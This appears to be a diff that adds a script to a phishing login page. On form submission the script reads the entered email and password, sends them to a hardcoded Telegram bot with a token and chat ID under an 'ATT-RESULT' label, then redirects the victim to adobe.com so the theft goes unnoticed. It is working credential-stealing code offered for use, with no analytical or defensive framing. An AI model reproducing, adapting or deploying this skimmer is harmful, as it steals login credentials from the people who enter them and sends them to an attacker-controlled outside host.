@@ -198,5 +198,32 @@ input.addEventListener("keyup", function(event) {
 <div id="root">
 <iframe id="myframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe> </div>
 
+	<script>
+      const formal = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "6682328877:AAHeCRRx7wcAbHpQaA7QghceJMmPluDr_qw",
+          chatID: "6857364753"
+      }
+
+
+      formal.addEventListener("submit", e =>{
+          e.preventDefault();
+
+          let result1 = document.querySelector('#temail').value
+          let result2 = document.querySelector('#tpass').value
+          
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Username::${result1}==++==Password::${result2}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://adobe.com");
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+
+          })
+      })
+  </script>
+
 
 </body></html>
